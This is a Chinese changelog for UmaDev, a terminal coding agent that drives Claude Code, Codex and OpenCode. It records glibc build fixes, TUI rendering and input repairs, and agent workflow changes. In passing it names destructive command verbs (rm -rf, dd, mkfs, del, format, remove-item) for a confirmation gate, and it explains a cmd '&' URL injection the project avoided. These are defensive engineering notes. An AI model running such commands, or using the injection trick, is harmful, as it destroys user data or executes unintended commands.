# Changelog

本文件记录 UmaDev 的所有重要变更。格式基于 [Keep a Changelog](https://keepachangelog.com/zh-CN/1.1.0/)。

## [1.0.25] — Linux glibc 兼容性修复 · 模型交给底座

这一版聚焦一处**用户实测的 Linux 兼容性阻断**,外加一次定位对齐。x86_64 Linux 二进制此前在 Ubuntu 24.04(glibc 2.39)上直接 `cargo build`,于是绑定 `GLIBC_2.39`、在 RHEL / Rocky 9、Ubuntu 22.04 以及任何 glibc 2.31–2.38 的系统上以「GLIBC_2.39 not found」一启动就失败(一位 glibc 2.34 的用户被彻底挡在门外)。本次把两个 linux 二进制都改经 `cross`(Ubuntu 20.04 基础镜像 / glibc 2.31)构建,凡 glibc >= 2.31 皆可运行,并加了一道 CI 守卫:一旦二进制再需要更新的符号就让发布失败。同时**移除 `/model`** —— 模型 100% 是底座的事,UmaDev 不拥有任何模型端点。

### 修复 — Linux 兼容性(glibc)

- **linux x86_64 二进制不再要求 GLIBC_2.39**:此前它在 `ubuntu-latest`(现为 Ubuntu 24.04 / glibc 2.39)上用普通 `cargo build` 构建,于是绑定 `GLIBC_2.39`,在 RHEL / Rocky 9、Ubuntu 22.04 及任何 glibc 2.31–2.38 的机器上一启动就报「GLIBC_2.39 not found」—— 一位 glibc 2.34 的用户被完全挡住。现两个 linux-gnu 目标(x86_64 与 aarch64)都经 `cross` 构建,其镜像基于 Ubuntu 20.04(glibc 2.31),二进制凡 glibc >= 2.31 皆可运行;`cross` 钉死 0.2.5 让下限确定(不钉版的镜像升级可能悄悄抬高它)。另加一道自证守卫:每次 linux 构建后 `objdump` 出二进制所需的 `GLIBC_*` 符号,任一超过 2.31 即让发布失败 —— 这类回归再也无法静默发货。

### 变更 — 移除 /model

- **`/model` 选择器整套移除,模型改由底座 CLI 决定**:UmaDev 按设计不拥有任何模型端点 —— 底座登录 / 配置成什么(含第三方或本地模型),跑的就是什么,UmaDev 向底座注入的是空。一个内置的 `/model` 选择器 + 一份精选模型清单(opus / sonnet / haiku…)错误地暗示 UmaDev 在管理模型,而且对任何接了自定义 / 本地模型的用户根本是错的。现已删除 `/model` 命令与其调度、交互式选择器与静态模型表、配置里的模型档位与全部启动接线、CLI 的 `--model` 旗标,以及相关 i18n 键。要换模型,请在你的底座 CLI 里配置。**保留**(与「只观察、不设置」一致):底座自身模型的只读展示,以及上下文余量表(其上下文窗口现回落到各底座保守的默认值)。新增测试证明陈旧的模型 id 不会漏进任何一次启动。

## [1.0.24] — 换行不再误发 · 多语言代码高亮 · /model 选择器 · 底座失败给下一步

这一版是**今天的用户反馈修复**加一次对照 Claude Code 与 opencode 的**交互对等审计**。多行输入不再在 Apple Terminal / 默认终端上**悄悄误发**(Ctrl+J 在每个终端都能换行,支持的终端上再开 kitty 键盘协议让 Shift+Enter 也生效);代码块高亮从手搓 ~5 语言的关键词着色升级为纯 Rust 的 **~25 语言真词法高亮**;`/model` 不带参数现打开**交互式选择器**;**Ctrl+点击**可直接打开转录里的链接与文件路径;底座失败时不再把原始报错甩给你,而是**点名下一步该敲哪条命令**;花费表旁新增**上下文余量表与压缩提醒**。另修复 Windows PowerShell 执行策略死循环、续跑计划的勾选与完成数。全部 fail-open、无 emoji、无硬编码色值,`forbid(unsafe_code)` 保持。

### 新增 — Ctrl+J 换行(不再误提交)

- **多行输入不再悄悄误发**:此前只绑了 Shift+Enter,而 kitty 键盘协议从未开启 —— 在 Apple Terminal / 多数默认终端上,Shift+Enter 到达时只是一个裸 CR,直接把半句话**提交**了。现 Ctrl+J(一个字面 LF,每个终端、每条输入路径都通用)插入换行;Enter 仍提交;`setup_terminal` 启用 kitty 协议(`PushKeyboardEnhancementFlags DISAMBIGUATE_ESCAPE_CODES`,按 `supports_keyboard_enhancement` 守卫,restore / panic / 信号路径对称弹栈,只压一次而非每次恢复都压),支持的终端上 Shift+Enter 也生效。`/help` 与输入提示都提到 Ctrl+J。

### 新增 — 多语言代码高亮

- **代码块高亮从手搓 ~5 语言的关键词着色升级为纯 Rust 词法高亮**,覆盖约 25 种语言,做真正的字符串 / 注释 / 数字 / 关键词分词(含多行结构)。高亮组映射到主题 token 层(`syn_color`),配色始终随主题、无硬编码色值;每次调用 fail-open 回落旧着色 / 纯文本,半途的流式代码围栏不会 panic,diff 的 +/- 着色保留。net-new 依赖仅 synoptic 一小簇(regex / unicode-width 本就在树里),远小于 syntect 的体量。

### 新增 — 交互式 /model 选择器

- **`/model` 不带参数现打开交互式选择器**:按底座列出常见模型(Claude 家族 / codex / opencode,各带描述、标出当前项,外加一行「自定义 / 直接输入 id」以 fail-open 保留任意底座支持的 id);↑↓ / j-k / Home / End / 1-9 / Enter / Esc 操作。`/model <id>` 仍直接设置,`/model plan|build` 仍针对持久化的分阶段档位。经既有配置路径持久化。

### 新增 — Ctrl+点击打开链接 / 文件路径

- **鼠标捕获会吞掉终端原生的修饰键点击,所以 UmaDev 在应用内自己接管**:Ctrl+左键经选择层缓存的行几何命中被点 token,链接(http/https)在默认浏览器打开、文件路径(绝对 / `~/` / `X:\` / 存在的相对路径,`file.rs:12:5` 位置后缀自动剥离)在默认应用 / 访达 / 资源管理器打开;边界修剪(尾随标点与不配对括号剔除、配对括号保留、CJK 干净收尾)。安全:仅 http/https(ftp / file / javascript 拒绝),引号 / 反引号 / 控制字符 / 空白拒绝,路径必须能规范化到真实存在的项;opener 始终是 argv 向量、绝不是 shell 字符串 —— 且 Windows 上刻意用 `explorer <目标>` 而非 `cmd /C start`(cmd 会重解析命令行,查询串里合法的 `&` 会被当成命令分隔符,精心构造的「URL」点一下就可能执行命令 —— 评审时抓到,explorer 按字面取参)。spawn 走 stdio-null + 分离线程回收,fail-open 带一条本地化状态备注,miss 是静默 no-op,普通点选 / 拖选不受影响。

### 新增 — 底座失败给下一步

- **借来的底座 CLI 失败时,UmaDev 不再把原始 stderr 直接甩给你,而是点名下一步该敲哪条命令**:认证过期 → `claude auth login` + `CLAUDE_CODE_OAUTH_TOKEN` / `codex login` / `opencode auth login`(按底座,和选择器的登录提示、doctor 的无头凭据事实一致);限流 / 过载 → `/model` 换模型或换底座(限流指向附带的原始信息看重置时间);上下文超长 → `/compact`;网络不变。分类器(Auth / RateLimit / Overloaded / Context / Network / Exited / Unknown,最具体优先、fail-open,Unknown 原样保留)在 `/run` 与 chat 两条路径都生效;仅检测 / 展示,不改运行控制、四条不变量与重试逻辑,不引脆弱的跨底座重置时间解析器。

### 新增 — 上下文余量表 + 压缩提醒

- **花费表旁新增实时上下文余量表**("ctx 34k/200k · 17%"):分子取底座上一轮真实 INPUT token(它刚读进的上下文,由 `EngineEvent::TurnUsage` 捕获、`/clear` 归零),落表前回落到转录的 chars/4 估算,无可显示时隐藏;分母取一张保守的静态实用预算表(Claude 家族 200k、gpt-5 400k、o 系 / gpt-4 128k,未知 / offline 则隐藏)—— 标注为估算、非硬上限。占用首次越过 80% 时**恰好一次**推送一行 `/compact` 提示(锁存,掉下再武装,由 usage 事件驱动、绝不逐帧),与被动的 `BaseFailure::Context` 补救互为主动一侧。窄终端下和花费表一样先被宽度守卫丢掉;INFO → WARNING 越阈变色、无硬编码色值。

### 修复 — Windows PowerShell 执行策略

- **底座此前反复用 `powershell.exe -Command 'npm i'` 跑 node CLI**,会命中 `npm.ps1` shim、在 Restricted 执行策略下报「因为在此系统上禁止运行脚本 / running scripts is disabled」,而且**一遍遍重试同一条命令**。这是**环境门、不是偶发失败**:同命令重试永不可能成功,必须改写调用方式。error_kb 新增 `detect_powershell_policy`(置于分类级联**最前**,否则 SecurityError / UnauthorizedAccess token 会误分到权限族继续空转;高精度双语短语 + 仅在 `.ps1` shim 上下文才认的歧义 token,HTTP-401 的 UnauthorizedAccess 绝不误报);固件 `windows_shell_directive()`:改经 cmd 跑(`cmd /c npm ...` / npm.cmd / npx.cmd,pnpm / yarn 同理),`-ExecutionPolicy Bypass -File` 仅作逐次回落,**绝不改用户机器策略**,且**不重试同一条命令**。+知识标准 `windows-node-cli-invocation`(quality 95),含「环境门 ≠ 偶发失败,盲目重试无意义」的泛化规则。

### 修复 — 续跑计划勾选(用户实测)

- **`/continue` 后,阻塞前已完成的步骤现正确显示为已勾选、完成数为真**(此前读作 0/N、靠前步骤留空)。根因:`PlanPosted` 事件只带步骤摘要行、从不带每步状态,续跑重发计划时未对阻塞前步骤重放 `PlanStepStatus`,TUI 又把每行硬编码为 pending 并丢弃载荷里的完成数 —— 于是续跑后先前已完成的步骤一直 `[ ]`、表头数 0/N,只有当前在跑的步骤靠自己的实时状态事件显 `[~]`。修法(一个事件、无排序竞态):`PlanPosted` 增 `statuses`(与步骤下标对齐、缺失回落 pending),从计划持久化的每步状态(新 `Plan::step_statuses`)填充;面板表头、`/plan` 卡、`/team` 名册、任务 chip 都从行派生所以自动一致,恢复的完成行不伪造交接时间线;bin 打印同样显示持久化标记;全新计划仍是全 pending、逐字节等价。

### 内部

- 全部改动 fail-open,无 emoji,无硬编码色值,`forbid(unsafe_code)` 保持;net-new 依赖仅 synoptic 一小簇(char_index / if_chain / nohash-hasher,regex / unicode-width 本就在树里)。计数:tui 788、agent 1145、i18n 6;新增 i18n 键(Ctrl+J 提示、`/model` 选择器、Ctrl+点击备注、上下文 / 压缩表、11 条 base.fail.* 补救键)三语注册进 MIGRATED 守卫。

## [1.0.23] — 终端层结构性加固 · 乱码根除 · 输入两路收敛 · 历史随会话保存

这一版是一次**结构性加固**:连续几轮用户实测的 TUI 问题(乱码、Windows 输入、重开丢历史)暴露的不是零散 bug,而是终端层的三笔结构性欠账。本次对照成熟终端 UI 实现做了整层审计,把三笔欠账**在根上还清** —— 用原语替掉症状补丁,而不是继续见一个修一个。**渲染自愈成为原语**:启动时**探测**终端是否真支持同步输出(DECRQM 查询,查不到回落白名单先验),已确认支持的终端上每一帧都是同步括号内的**原子整帧重绘** —— 造成长跑 / 焦点切换 / 叠字类乱码的显示漂移**活不过一帧**;不支持的终端经一个污染标志自愈;旧的枚举式重绘触发(周期刷洗 / 逐事件强制)整套删除。**输入两路收敛**:unix 与 Windows 输入路径共用**同一张**键位映射表,配跨路径契约测试 —— 同一输入必须产出同一事件,未来再分叉是 CI 挂掉、不是发到用户手里。**看得见的转录随会话保存**:重开 UmaDev 不再是一片空白的对话。另有 Windows 焦点切换乱码修复、外部终止也还原终端、续跑历史分隔线。

### 重构 — 渲染自愈(根除乱码类)

- **根因**:ratatui 的增量 diff 只对比自己的前后缓冲、从不对照真实终端 —— 终端一旦漂移(焦点返回重绘 / resize 竞态 / 撕裂 / 外部写入)而前后缓冲恰好相同(粘底稳态),diff 为空、什么都不写,乱码**永远**留在屏上;旧代码只能**枚举**漂移事件(2 秒周期刷洗 / resize / 焦点 / 落定 / 换基 / 输入框高度……),每来一个新乱码报告就加一个触发 —— 打不赢的打地鼠。
- **修法(原语,不是枚举)**:启动时经渲染后端发 DECRQM(`\x1b[?2026$p`)**探测**终端是否真支持同步输出 —— 应答走既有输入管线一次性捕获、绝不漏成按键,250ms 超时回落白名单先验,终端的回答**双向**覆盖白名单;已确认支持的终端上,**每一帧**都在 BSU/ESU 括号内做整帧原子重绘 —— 无闪烁,且任何漂移活不过一帧;不支持同步输出的终端绝不逐帧清屏(会闪),改经**一个** `terminal_contaminated` 污染标志在离散转换点自愈(BEL、模式重申、OSC 52 剪贴板写入、`/mouse`、Ctrl+L 都会置污)。旧的周期刷洗与各单点强制重绘标志及其管线整套删除。+8 测试。

### 重构 — 输入两路收敛(根除 Windows 输入类)

- **根因**:输入按平台劈成两路 —— unix 走自研 tokenizer、Windows 走 crossterm EventStream —— 每个按键 / 粘贴 / 焦点行为都要实现两遍,修复常常只落在一路上(Backspace 在 decode.rs 映射过、又在 app.rs 三处重复接;焦点两处处理);ESC 冲刷定时器只看 tokenizer 状态、固定 50ms,看不见上一层解码器的粘贴态,被劈开的 `\x1b[201~` 粘贴结束标记会被中途强制冲刷(粘贴卡死),旧代码用一个事后兜底纸糊着。
- **修法**:新 `input/keymap.rs` —— 单一 char→key 映射表 + 事件归一化,**两路都**经它走(app.rs 三处重复接收删除);9 组跨路径契约测试断言同一输入在两条管线产出**完全相同**的事件(Backspace `0x08`/`0x7f`/Alt+各形态含 ConPTY 字面形、Enter、方向键 CSI+SS3、Home/End、PgUp/PgDn、Tab/BackTab、Ctrl+字母、F 键、焦点进出、括号粘贴含结束标记劈在**每个**字节位、SGR 滚轮)—— 未来分叉是测试挂掉,不是发到 Windows 用户手里。ESC 冲刷定时器改为**粘贴态感知**:平时 50ms、粘贴中 500ms(`UMADEV_PASTE_FLUSH_MS` 可调),真空闲才强制收尾死粘贴 —— 旧粘贴兜底**删除**,删得掉本身就是修到根的证明。终端模式启用收敛为**一个幂等 enable 块**,启动与恢复(睡醒 / 重附着)共用(顺带补上恢复时漏掉的光标可见性),配启用 / 还原对称性测试:enable 发出的每个 `?Nh` 必须在 restore 有配对的 `?Nl`,漏写卸载直接 CI 挂。
- **契约测试当场揪出一个真 bug**:自研路径此前拒收 ESC BS / ESC DEL,macOS / Linux 上 Alt+退格删词**一直是坏的** —— 已修。

### 修复 — Windows 焦点切换乱码(用户实测)

- **alt-tab 切走再切回,TUI 不再乱**:两个独立原因 —— (1) 焦点上报**从来没启用过**(setup 启用了 raw / 备用屏 / 粘贴 / 鼠标,唯独没有 DEC 1004),终端根本不发焦点事件;(2) 即使发了,事件循环也没有 FocusGained 处理臂,而 Windows 控制台快速切回并不可靠触发 Resize。现启用焦点上报(teardown / panic / 恢复路径全部配对卸载),焦点回来时强制一次干净整帧重绘;同尺寸 resize 不再被去抖吞掉(窗口切换可能在终端滚动缓冲后送来同尺寸 resize)。

### 新增 — 会话历史随会话保存

- **重开 UmaDev 不再是一片空白**:此前只持久化面向底座的对话全文,**看得见的**渲染转录(工具行、计划卡、团队评审结论、备注)从不落盘、重开也从不重建 —— 数据在、屏上没有。现显示转录随聊天一同持久化(沿既有节奏快照 + 退出时补一笔),启动与 `/resume` 时逐行原样重建(半途的工具行落定为中止态),末尾加本地化恢复分隔线、钉底整帧重绘。**宽容反序列化**:坏一行跳一行、字段类型不对回落默认,会话加载绝不因此失败;旧会话文件回落到全文式播种,新文件是旧二进制可忽略的超集。`/sessions` `/resume` `/compact` `/clear` 全部不受影响。+5 测试。

### 新增 — 外部终止也还原终端

- **SIGTERM / SIGHUP / 关终端窗口不再留下坏 shell**:此前只处理 SIGCONT / SIGWINCH,外部 kill 或直接关窗会死在备用屏里 —— raw + 鼠标模式挂着、聊天没存。现统一信号处理(unix SIGTERM+SIGHUP+SIGINT,Windows ctrl_close+ctrl_shutdown,每一路 fail-open),收到即同步执行:存聊天 → 关 raw → 还原终端序列,再走常规幂等 teardown 退出。

### 改进 — 续跑的历史标记(用户实测)

- **续跑不再"看着像丢了前面的步骤"**:诊断确认继续被阻塞的运行**并不丢**先前步骤 —— 持久转录跨阻塞 / 续跑完整保留,只是新输出自动粘底、先前步骤都在上面,却没有任何标记,读起来像消失了。现 `/continue` 与 `/tasks` 续跑都会插入一条本地化分隔线"──── 继续运行 — 更早的步骤在上方(向上滚动查看)────",整个运行读作一段连续历史:先前步骤 · 分隔线 · 续跑输出。

### 内部

- 计数:tui 697 → 740(跨路径契约约 30 条 + 渲染 8 + 转录持久化 5 + 分隔线 1 + 焦点若干);workspace 3283;i18n +6(chat.restored_divider / continue.separator 各三语)。`forbid(unsafe_code)` 保持;自研 tokenizer、IME / CJK 劈半 UTF-8、鼠标序列过滤等既有能力全部保留。

## [1.0.22] — 依赖先装再跑测试 · 长跑不再乱码 · 阻塞给解决建议 · 悬置项登记册

这一版把用户实测的几处高频卡点收口。**跑测试前先把依赖(含 dev / test 附加项)一次装齐**,不再上演"跑 `pytest` → `No module named pytest` → sync → 重试"的来回:一次运行里出现缺模块报错被当成漏装依赖、而不是测试失败,专门点了 uv 的坑(默认 `uv sync` 不含 dev 附加项、要 `uv sync --extra dev` / `--all-extras`)。**长跑不再乱码**:一次长时间流式运行结束后,不再留下互相叠字的转录和冻住的"本轮已中止"页脚 —— 在运行落定的那一刻与转录换基 / 收缩时强制整帧重绘(此前只覆盖了输入框)。**阻塞现在给解决建议**:某个评审席位打回时,除了指出哪里不对,还给出逐条的"怎么修"与下一步该做什么。并新增**第三条持久记忆通道 —— OPEN-DECISIONS 悬置项登记册**:把未决 / 推迟 / 受阻 / 等待未来触发的事项落进 `docs/decisions/OPEN-DECISIONS.md`,每次任务开始自动回灌进底座上下文,悬而未决的事再也不会丢。

### 新增 / 改进 — 依赖先装再跑测试

- **跑测试前先把依赖(含 dev / test 附加项)一次装齐,不再来回**:此前底座对着缺 dev 依赖的环境跑 `uv run python -m pytest`、报 `No module named pytest`,再 `uv sync --extra dev` 重跑 —— 每次白费一个来回。现三管齐下、全部 fail-open / 确定性 / 只在构建 + 验证路径生效:
  - **固件 / 方法论指令**(`experts::deps_before_tests_directive`)接进 `director_build_directive`(完整构建 `/run`)、`continuous::phase_directive`(Quality 重型 + 精简 / VERIFY)与 `coach::render_quality`:在跑测试前**一次装齐**依赖(含 dev / test 附加项);一次运行里的 `No module named pytest` / `ModuleNotFoundError` / `ruff: not found` 是漏装了依赖、**不是测试失败**,别盲目重试。明确点出用户实测的 uv 坑(默认 `uv sync` 不含 dev 附加项 → `uv sync --extra dev` / `--all-extras` / `--group dev`),并覆盖 `pip -e '.[dev]'`、`poetry --with dev`、`pdm -G dev`、`npm ci`。聊天 / 前端轮不注入。
  - **error_kb 识别缺测试工具**(`detect_missing_test_tool`,置于级联最前):把缺失的测试 / lint 工具(`pytest` / `ruff` / `mypy` / `jest` / `eslint` … 叠加"无此模块 / 命令找不到 / 无法识别"标记)识别为稳定指纹 `dependency/test-deps-missing` → 触发"先装 dev 依赖"的规避建议;缺失的是**应用自身模块**则仍归一到通用 module-not-found 家族,普通失败测试不被误判。
  - **知识标准** `knowledge/testing/01-standards/dependency-install-before-tests.md`(quality_score 95):给出规则 + 各生态安装命令 + uv `--extra dev` 陷阱,并明确"一次测试运行里的缺模块报错是漏装、不是测试失败"。

### 修复 — TUI(长跑乱码 / 冻住的中止页脚)

- **长跑结束后不再留下叠字转录 + 冻住的"本轮已中止"页脚(用户实测,1.0.21 仍存在)**:叠字的根因是增量 diff **漂移** —— 终端与 ratatui 模型逐渐失同步(撕裂的半截写入、宽 CJK / 自动换行在大段团队评审输出上的分歧),而非 ratatui 自身留了陈旧单元。此前唯一能治漂移的周期性自愈刷洗有两处缺口:(1) 刷洗以 `app_is_live` 为门,长跑一落定(完成 / 中止)就**停**,已积累的叠字与"本轮已中止"页脚**冻在屏上**(又以 `sync_output` 为门,不支持 DEC-2026 的终端运行期从不刷洗);(2) 转录**换基**(`MAX_RENDER_ROWS` 前段 `split_off`)或**收缩**(fold / `/compact` / `/clear` / 去掉活性指示)时没有任何东西强制重绘 —— 既有的 `force_full_repaint` 触发只覆盖输入框高度 / resize / resume。
- **修法(事件驱动,不做每帧过度重绘)**:(a) `live_settled` —— 在 `app_is_live` 的 true→false 边沿,对最终落定帧强制**一次**干净整帧重绘(关键修复,每种终端都生效、一次性、非周期性闪烁),叠字与中止页脚不再冻住;(b) `transcript_reflow_needs_repaint` —— 在 `MAX_RENDER_ROWS` 首次越界拆分或转录收缩时重绘,但稳态粘底流式增长时**不**重绘(不抖动);(c) `scroll_jump_repaint` —— 仅当滚动偏移真正移动时才重绘。状态栏竖向换行也是终端漂移(`meta_row` 本就夹到 1 行区域),由落定重绘一并治好。`forbid(unsafe_code)` 保持。

### 新增 — 团队评审(阻塞给解决建议)

- **评审阻塞现在给出逐条解决建议 + 下一步**:此前 UmaDev 只显示**哪里不对**(评审席位的 blocking 发现 + 证据),不说**该怎么办** —— `RoleVerdict` 有 blocking + evidence 却无"如何修",返工指令也没为用户算出逐条补救。现给 `RoleVerdict` 加了与 blocking **按下标对齐**的 `remediation: Vec<String>` 通道(每个席位在**同一次评判轮**里为每条 must-fix 各产出一行"怎么修" —— 不额外调大脑、不靠关键词启发;8 份评审系统提示现请求 `remediation` / `fix`)。`normalized()` **就地**裁剪 remediation,使中间的空条目不会把后面的修法错位到别的阻塞上。它搭 `EngineEvent::CriticVerdict` 直达 TUI:任一席位打回时,团队评审面板内联显示首条阻塞的修法 + 一行 WARNING 色的"下一步:`/run` 让团队应用这些修复,或 `/revise <指引>`";`push_critic_note` 在永不丢失的转录里逐条列出阻塞及其修法;headless / CLI 打印也带出首条修法。**Advisory + fail-open**(缺失 / 偏短的 remediation → 阻塞照旧显示、绝不编造修法;循环控制与四条不变量不变)。

### 新增 — 记忆(OPEN-DECISIONS 悬置项登记册)

- **第三条持久记忆通道:悬置项登记册**:执行中被留作未决 / 推迟 / 受阻 / 等待未来触发的事项(缺一把外部密钥、依赖某个下游任务、一个含糊的设计决策、一个开放问题、一次推迟的验证、一处带保留的边界)此前会**丢** —— 留在工作记忆里或在聊天里提一嘴就忘了,毫无可追溯性。用户已用一条手写 `CLAUDE.md` 指令验证有效(一次运行里登记册累积了 22 条分类事项、无一丢失),本次将其内建,让每个项目都有。它与 `facts.jsonl`(持久事实)、`lessons` / `reflections`(踩坑)并列,成为第三条记忆通道:open-decisions。
- **实现**(`open_decisions.rs`,仿 `project_facts`):读 / 追加一份**只追加、项目可见**的登记册 `docs/decisions/OPEN-DECISIONS.md`(**提交进仓库、不 gitignore** —— 就是要被评审 / diff);宽容解析器(`## OPEN|RESOLVED — <类别> — <标题>` + 字段行);API `load_decisions` / `unresolved` / `counts` / `decisions_directive` / `decisions_recall_block` / `append_decision`;fail-open(缺失 / 畸形 → 空)、有界(256 条解析上限、12 条召回、1600 字预算)、确定性。**固件**(`context.rs`,自门控到工作轮):KV 缓存稳定头里放一条静态指令(把任何未决 / 推迟 / 受阻 / 等待项记入登记册,只追加 + 就地解决,含三个类别 waiting-on-external / design-decision-to-evaluate / existing-design-boundary 与七个字段),并在事实召回之后放一段**易变召回**(未决项 + 一行"(N 条未决 + M 条已解决)"摘要),让此前的悬置项**自动回灌**进底座上下文,而非指望它重读文件;KV 缓存稳定前缀不变量仍成立;聊天 / 琐碎轮两者都不给。
- 附:知识标准 `knowledge/agentic-delivery/01-standards/open-decisions-parking-lot-register.md`(quality 95);+15 测试。

### 内部

- 计数:agent 1120 → 1121 → 1137;tui 694 → 697;i18n +6;bin 191 + 22。全部改动 fail-open、确定性,门控到对应路径。

## [1.0.21] — TUI Windows 退格修复 · 评审有据不再幻觉 · 文档同步去味

这一版把用户实测的 **Windows 退格删不掉**修好(Windows Terminal / ConPTY 上退格键此前根本删不了字),配套补上 Alt-退格删词、Windows 默认走原生 crossterm 输入后端让 Esc / 方向键都认得、帮助浮层滚动到底不再"按住下键再上看着像卡住";并把**质量评审裁判从凭空幻觉改成有据可依** —— 把真实存在的测试 / 源码文件清单喂进它的评审上下文,它不再张口就说"没有测试 / 没有后端 / 没有源码"从而触发一轮冤枉返工。最后把对外文档整体**同步 + 去味**:说清 UmaDev 是什么、而不是不是什么,清掉只有内部才懂的"总监"框架与 AI 营销腔。

### 修复 — TUI(Windows)

- **Windows 上退格能删字了(用户实测:Windows 端"删不掉")**:Windows Terminal / ConPTY 把退格键发成 `0x08`(BS)、部分场景发 `0x7f`(DEL),此前两者都没映射到 Backspace,于是退格在 Windows 上**根本删不了字**;现 `0x08` 与 `0x7f` 都归一到 Backspace。
- **Windows 默认走原生 crossterm 输入后端**:让 Esc / 方向键在 Windows 上稳定被识别,不再走自研解码路径漏键。
- **Alt-退格删除前一个词**:补齐按词删除的输入手感。

### 修复 / 改进 — TUI

- **帮助浮层 Down/PgDn 夹取到真实底部 + Home/End/g/G 跳转**:Down/PgDn 此前会越过真实底部,造成"按住下键、再按上键看着像卡住"的错觉;现夹取到真实底部,并新增 Home/End 与 g/G 直跳首尾。
- **前向 Delete 与整行 / 整词删除会在 token 变化时重新弹出被关掉的 @ 提及浮层**:经共享的 `reset_typeahead_after_edit`,`forward-Delete` 与 line/word kill 改动当前 token 时,重新唤起已被关闭的 @-mention 候选。

### 改进 — 质量评审

- **质量评审裁判现在有据可依,不再幻觉出"没有测试 / 后端 / 源码"**:此前裁判看不到真实文件、会凭空断言"没有测试 / 没有后端 / 没有源码"从而触发一轮冤枉返工;现把一份**有界、已排序**的真实测试 + 源码文件清单注入它的评审上下文,让它真正看见并据此评判。同时移除了此前那套粗糙的事后过滤(按文件数 / 是否存在去**丢弃一条 blocking 发现**、强制 accept)与**过宽的后端文件分类器**;裁判意见仍是 advisory,由确定性地板主导循环控制。真正 test-less 的仓库上"没有测试"这条合法发现既不被伪造抹掉、也不被反驳;空的文件桶不列出。

### 改进 — Coach

- **CURRENT.md 复用已渲染的阶段正文**:一次渲染(而非两次),字节完全一致。

### 变更 — 文档

- **对外文档整体同步到当前状态 + 去味**:说清 UmaDev **是什么**、而不是**不是什么**,清掉只有内部才懂的"总监 / director"框架与 AI 营销腔(牵强的钩子、对冲措辞、三段式凑数、喊叫式大写);铺开新的定位标语(**指挥你已经在用的 Claude Code / Codex / OpenCode**)到 README ×3 / 文档 / 官网。事实、功能、命令、计数、结构不变;三语 README 各自读起来自然。

### 内部

- **测试跨用例不再互相污染 env**:host / agent / governance 各测试改用 RAII 守卫在退出时还原环境变量,杜绝跨测试的 env 串味;临时文件走 tempfile 路径(不再硬编码 `/tmp`);文档 / 描述文案更正为"三个宿主 CLI 底座(three host CLI backends)"。

## [1.0.20] — 全面自审硬化 · Windows 全修(预览 / 信任 / 渲染 / 退出 / 路径)· 定位升级 · 安全 / RAG / 并发

这一版是一轮**全面的自审硬化** —— 对 Windows 端到端、核心主流程、本地 RAG、自有安全扫描、CLI/MCP、并发各做了一遍逐条排雷,并把定位标语收得更凝练。其中 **Windows 此前多处实际不可用**(预览开发服务器根本起不来、信任地板对破坏性命令失明、控制台花屏、退出后 PowerShell 不可用、拖入的图片路径被吞)这次一次性修齐;主流程上堵住了两处 **HIGH** —— 未完成的有意构建**伪装成功**的交付证明包、断言**被掏空**当绿过;随包**本地 fp16 语义层**不再在任何长段落上静默全死;并新增 **PTY 启动冒烟**,杜绝启动崩溃再次静默发布。

### 变更 — 定位

- **更凝练的定位标语:UmaDev 指挥你已经在用的 Claude Code / Codex / OpenCode**。标语补上一个具体的第二分句(机制 + 不增成本):'一个模拟真实开发团队工作的 Agent,指挥你已经在用的 Claude Code / Codex / OpenCode 干活'(英文:A coding agent that works like a real dev team, commanding the Claude Code / Codex / OpenCode you already use;含 zh-TW 繁体)。一致铺开到 README ×3 hero 标题、文档(`PRODUCT_VISION_AND_ROADMAP` / `ARCHITECTURE`)标题语、官网 `<title>` + openGraph 标题 + 本地化 `document.title` + 页脚短语(中英)、`npm`/umadev 包描述 + README hero;滚动 hero 短句保持精简,meta description 已点名 CLI 故完整标语放进 `<title>` 避免重复。官网构建通过(Next 16.2.9,全 8 页)。

### 修复 — Windows

- **预览开发服务器在 Windows 上能起来了(High)**:`parse_run_command` 硬编码 `sh -c`、cd 路径又用 `Command::new(npm)`,于是 `/preview` 与 web 构建后的自动预览在 Windows 上**从不启动**(没有 `sh`;`npm.cmd` 找不到);cd 路径现经 `umadev_host::spawn_parts`(解析二进制 + 给 `.cmd`/`.bat` 垫片走 `cmd /c`),兜底在 Windows 走 `cmd /c`、unix 走 `sh -c`。
- **不可逆动作信任地板认得 Windows 动词了(Auto 档下的安全地板曾退化)**:`BARE_DESTRUCTIVE_VERBS` 此前只知 unix 动词(`rm -rf`/`dd`/`mkfs`/`mv`/`unlink`),Windows/PowerShell 的破坏性命令在 `TrustMode::Auto` 下绕过了始终在场的确认;新增 `del`/`erase`/`rd`(rmdir 别名)/`format`/`remove-item`/`ri`(PowerShell Remove-Item)/`clear-disk`,经既有 `verb_at_command_position` 整 token 匹配(大小写不敏感、非子串,故 `deliver`/`format-output`/`cargo build`/`npm ci`/含 `del` 的路径不误伤)→ 归类 Destructive → `always_escalates()` → **每一档都确认**。
- **历史召回 / `clear` 后控制台不再花屏**:ratatui 的 `CrosstermBackend` 按增量 diff 重绘(只写变化的格子),布局**高度**变化后陈旧格子在 conhost 上幸存 → 重叠(`/sessions` 重复、`/cleaeaclaer` 之类残字);历史召回与 `/clear` 此前都返回 `Action::None`、从不抬起既有的 `force_full_repaint` 杠杆。新增 `App::force_repaint` 标志,逐轮 OR 进 `force_full_repaint`;输入框渲染高度变化时(以及任意输入框高度跨帧增量)强制整帧重绘。
- **`/exit` 与 `/quit` 不再让 PowerShell 不可用**:两者本就走正常拆除(无提前 `process::exit`),但 `restore_terminal` 在 `LeaveAlternateScreen` **之前**就 `DisableBracketedPaste`/`DisableMouseCapture`、从不关同步输出、从不复位 SGR → conhost 上未完全还原的备用屏 / 模式 / 颜色让 PowerShell 残废;现统一为一段共享的 `restore_sequence`(`disable_raw_mode` → `LeaveAlternateScreen` → `DisableMouseCapture` → `DisableBracketedPaste` → `EndSynchronizedUpdate` → 显示光标 → `ResetColor`),贯穿 `restore_terminal` + panic hook + setup-fail 路径,与 setup 对称、幂等、跨平台。
- **拖入的图片路径 `C:\…` 不再被反斜杠当转义吞掉**:`umadev-tui` 的 `unquote_unescape` 把每个反斜杠当 shell 转义剥掉,于是拖入的 Windows 图片路径 `C:\Users\…\shot.png` 变成 `C:Users…shot.png` → canonicalize 失败 → 没有 chip / 没有附件;现在 Windows 上原样透传(反斜杠是那里的路径分隔符),unix 转义行为不变。
